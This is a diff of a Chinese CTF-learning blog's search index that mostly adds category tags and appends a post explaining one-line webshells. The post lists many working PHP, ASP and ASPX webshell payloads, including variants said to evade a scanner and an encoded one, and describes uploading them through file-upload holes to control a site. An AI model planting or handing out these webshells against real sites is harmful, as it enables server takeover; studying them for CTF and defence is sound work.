@@ -51,6 +51,9 @@
     <title>ctf基础学习-2</title>
     <url>/2021/09/05/ctf%E5%AD%A6%E4%B9%A0/ctf%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-2/</url>
     <content><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2>]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>ctf基础学习-1</title>
@@ -69,6 +72,9 @@
 <h4 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH-抢占山头"></a>KoH-抢占山头</h4><p>选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(队伍名称或是Token之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击。</p>
 <h4 id="Mix【混合】"><a href="#Mix【混合】" class="headerlink" title="Mix【混合】"></a>Mix【混合】</h4><p>混合模式结合了以上多种模式。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>Hello World</title>
@@ -149,6 +155,9 @@
 <li></li>
 </ol>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>sql基础学习-1</title>
@@ -157,6 +166,9 @@
 <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>SQL</strong> (Structured Query Language：结构化查询语言) 是用于管理关系数据库管理系统（RDBMS）。 SQL 的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。</p>
 <p><strong>RDBMS</strong> 指关系型数据库管理系统，全称 Relational Database Management System。RDBMS 是 SQL 的基础，同样也是所有现代数据库系统的基础，比如 MS SQL Server、IBM DB2、Oracle、MySQL 以及 Microsoft Access。RDBMS 中的数据存储在被称为表的数据库对象中。表是相关的数据项的集合，它由列和行组成。</p>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>第一篇博客</title>
@@ -199,6 +211,9 @@
 <h4 id="6-misc杂项"><a href="#6-misc杂项" class="headerlink" title="6.misc杂项"></a>6.misc杂项</h4><p>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag<br>常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p>
 <p>​        主要就是指“取证、隐写”等 一 些其它的方向。例如：GIF图片隐写、PDF隐写、流量隐写、二维码复原。</p>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>第三篇博客</title>
@@ -301,6 +316,9 @@ pic.save(&quot;文件名（包括文件类型即扩展名）&quot;)
 <p>（2）与佛论禅：格式：“佛曰：+佛语”</p>
 <p>（3）与熊问道：类似与佛论禅，开头为“熊曰”。</p>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>第二篇博客</title>
@@ -481,6 +499,9 @@ pic.save(&quot;文件名（包括文件类型即扩展名）&quot;)
 <p>（9）stegpy</p>
 <p>（10）silenteye</p>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>第五篇博客</title>
@@ -613,6 +634,9 @@ print(s_int, s_bytes)
 </code></pre>
 <p>不在范围内的字符（不可显示的）会以/-x……的形式显示出其的十六进制。</p>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>第六篇博客</title>
@@ -756,6 +780,9 @@ print(&quot;m =&quot;，m)
 <p>p·q = n</p>
 <p><strong>已知明文高位攻击：</strong>……</p>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>第十一篇博客</title>
@@ -1005,6 +1032,9 @@ static void *___memcpy(void *dest, const void *src, size_t n)
 <p>以上引用书籍：</p>
 <p>[1]操作系统真象还原<br>[2]王爽汇编语言<br>[3]维基百科</p>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>第十二篇博客</title>
@@ -1049,6 +1079,9 @@ ebp -&gt; ebp
 </code></pre>
 <p>64位下：1.寄存器传参 2.保存现场 3.销毁栈帧，返回caller</p>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>第八篇博客</title>
@@ -1186,6 +1219,9 @@ ebp -&gt; ebp
 <p>内网端口扫描可以用”dict://“或”http://“协议等，使用协议需要根据SSRF是如何造成的来具体分析。（内网扫端口并无特定端口）</p>
 <p>边界机器存在ssrf，通过dict或者http等协议扫本地端口或内网网段（如本地的5000端口上存在一个flaskweb，那么请求127.0.0.1：5000的时候能访问到，内网同理）找到内网web应用后通过http协议访问并尝试攻击，如果要发生post请求可以使用gopher，知道到内网脆弱应用后可以通过gopher协议进行攻击。</p>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>第十篇博客</title>
@@ -1345,6 +1381,9 @@ except Exception:
 <p><strong>sql防御方法：</strong></p>
 <p>可利用addcslashes()函数将输出进行过滤，将单引号转义使之无法闭合等</p>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>第四篇博客</title>
@@ -1371,6 +1410,9 @@ except Exception:
 <p>有时查找到的flag需要用在线工具进行解密，有时在用wireshark做流量分析时也要将软件进行解密设置（打开对应的密钥文件），否则flag藏在加密的数据包里面而无法查找。</p>
 <p>有些在请求包里面的题目可以用一般的流量导出的方法，然后在ubuntu中输入命令grep flag -rna .进行查找。</p>
 ]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
   </entry>
   <entry>
     <title>解题—BUUCTF</title>
@@ -3357,6 +3399,68 @@ print(flag)
 ]]></content>
       <categories>
         <category>upload-labs通关指南</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>一句话木马</title>
+    <url>/2022/01/20/ctf%E5%AD%A6%E4%B9%A0/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
+    <content><![CDATA[<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。</p>
+<p>渗透人员会上传一句话木马（<strong>简称Webshell</strong>）到目前web服务目录继而提权获取系统权限。</p>
+<h4 id="入侵条件"><a href="#入侵条件" class="headerlink" title="入侵条件"></a>入侵条件</h4><ol>
+<li>木马上传成功，未被杀；</li>
+<li>知道木马的路径在哪；</li>
+<li>上传的木马能正常运行。</li>
+</ol>
+<h4 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h4><p>asp一句话木马：&lt;%execute(request(“value”))%&gt;</p>
+<p>php一句话木马：<?php @eval($_POST[value]);?></p>
+<p>aspx一句话木马：&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“value”])%&gt;</p>
+<p>其他一句话木马：</p>
+<p>&lt;%eval request(“value”)%&gt;</p>
+<p>&lt;%execute request(“value”)%&gt;</p>
+<p>&lt;%execute(request(“value”))%&gt;</p>
+<p>&lt;%If Request(“value”)&lt;&gt;”” Then Execute(Request(“value”))%&gt;</p>
+<p>&lt;%if request (“value”)&lt;&gt;””then session(“value”)=request(“value”):end  if:if session(“value”)&lt;&gt;”” then execute session(“value”)%&gt;</p>
+<SCRIPT language=VBScript runat="server">execute request("value")</SCRIPT>
+
+<p>&lt;%@ Page Language=”Jscript”%&gt;</p>
+<p>&lt;%eval(Request.Item[“value”],”unsafe”);%&gt;</p>
+<p>可以躲过雷客图的一句话木马：</p>
+<p>&lt;%</p>
+<p>set ms = server.CreateObject(“MSScriptControl.ScriptControl.1”)</p>
+<p>ms.Language=”VBScript”</p>
+<p>ms.AddObject “Response”, Response</p>
+<p>ms.AddObject “request”, request</p>
+<p>ms.ExecuteStatement(“ev”&amp;”al(request(“”value””))”)</p>
+<p>%&gt;</p>
+<p>不用’&lt;,&gt;’的asp一句话木马：</p>
+<script language=VBScript runat=server>execute request("value")</script>
+
+<p>不用双引号的一句话木马：</p>
+<p>&lt;%eval request(chr(35))%&gt;</p>
+<p>UTF-7编码加密:</p>
+<p>&lt;%@ codepage=65000%&gt;&lt;%  response.Charset=”936″%&gt;&lt;%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-#+ACI)+j-)+j-%&gt;</p>
+<h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>最简单的一句话木马<code> &lt;?php @eval($_POST[&#39;attack&#39;]);?&gt;</code></p>
+<p>利用文件上传漏洞，往目标网站中上传一句话木马，然后就可以在本地通过菜刀蚁剑获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。attack作为连接菜刀蚁剑的密码。</p>
+<p>这句话什么意思呢？</p>
+<ol>
+<li><p>php的代码要写在<?php ?>里面，服务器才能认出来这是php代码，然后才去解析。</p>
+</li>
+<li><p>@符号的意思是不报错，即使执行错误，也不报错。<br>为什么要加上@——没有加上@会报错，因为一个变量没有定义，就被拿去使用了，服务器就会善意的提醒：Notice，你的xxx变量没有定义。但这样一提醒就暴露了密码</p>
+</li>
+<li><p>为什么密码是cmd呢？</p>
+<p>传输数据的两种方法：get、post。<code>$_POST[&#39;a&#39;]</code>的意思就是a这个变量，用post的方法接收。post是在消息体存放数据，get是在消息头的url路径里存放数据（例如xxx.php?a=2）</p>
+</li>
+<li><p>如何理解eval()函数？</p>
+<p>eval()把字符串作为PHP代码执行。</p>
+<p>例如：eval(“echo ‘a’”);其实就等于直接 echo ‘a’;再来看看<?php eval($_POST['pw']); ?>首先，用post方式接收变量pw，比如接收到了：pw=echo ‘a’;这时代码就变成<?php eval("echo 'a';"); ?>。<br>连起来意思就是：用post方法接收变量pw，把变量pw里面的字符串当做php代码来执行。所以也就能这么玩：也就是说，你想执行什么代码，就把什么代码放进变量pw里，用post传输给一句话木马。你想查看目标硬盘里有没有小黄片，可以用php函数：opendir()和readdir()等等。想上传点小黄片，诬陷站主，就用php函数：move_uploaded_file，当然相应的html要写好。你想执行cmd命令，则用exec()。</p>
+<p>前提：php配置文件php.ini里，关掉安全模式safe_mode = off，然后再看看 禁用函数列表 disable_functions = proc_open, popen, exec, system, shell_exec ，把exec去掉，确保没有exec（有些cms为了方便处理某些功能，会去掉的）。</p>
+</li>
+</ol>
+<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p>大佬博客<a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">https://blog.csdn.net/weixin_39190897/article/details/86772765</a></p>
+<p>百度百科<a href="https://baike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1845646?fr=aladdin">https://baike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1845646?fr=aladdin</a></p>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
       </categories>
   </entry>
 </search>
